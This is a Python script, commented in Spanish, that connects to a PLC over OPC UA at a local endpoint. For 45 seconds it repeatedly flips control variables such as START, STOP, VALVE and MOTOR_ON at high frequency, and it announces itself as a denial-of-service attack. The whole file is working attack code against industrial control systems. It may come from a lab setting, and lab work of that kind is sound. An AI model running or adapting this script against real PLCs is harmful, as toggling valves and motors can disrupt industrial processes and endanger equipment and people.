from opcua import Client
import time
import logging

# Configuración
PLC_ENDPOINT = "opc.tcp://127.0.0.1:4840"
VARIABLES = [
    "START",
    "STOP",
    "SENSOR_1",
    "SENSOR_2",
    "VALVE",
    "MOTOR_ON",
    "LIGHT_ON",
    "YES"
]
DURATION = 45  # segundos
INTERVAL = 0.01  # frecuencia entre escrituras

# Setup
logging.basicConfig(level=logging.INFO)
start_time = time.time()

print(f"[+] Iniciando ataque DoS durante {DURATION} segundos con intervalo de {INTERVAL}s...")

try:
    client = Client(PLC_ENDPOINT)
    client.connect()
    print("[+] Conexión establecida con el PLC")

    while time.time() - start_time < DURATION:
        for var_name in VARIABLES:
            try:
                node_id = f"ns=4;s=|var|{var_name}"
                node = client.get_node(node_id)

                # Leer y alternar el valor
                current = node.get_value()
                new_value = not current
                node.set_value(new_value)

                logging.info(f"[+] {var_name} cambiado de {current} a {new_value}")
                time.sleep(INTERVAL)

            except Exception as err:
                logging.error(f"[-] Fallo al modificar {var_name}: {err}")

except Exception as e:
    logging.error(f"[-] Error al ejecutar ataque: {e}")

finally:
    try:
        client.disconnect()
        print("[+] Conexión cerrada correctamente")
    except:
        pass
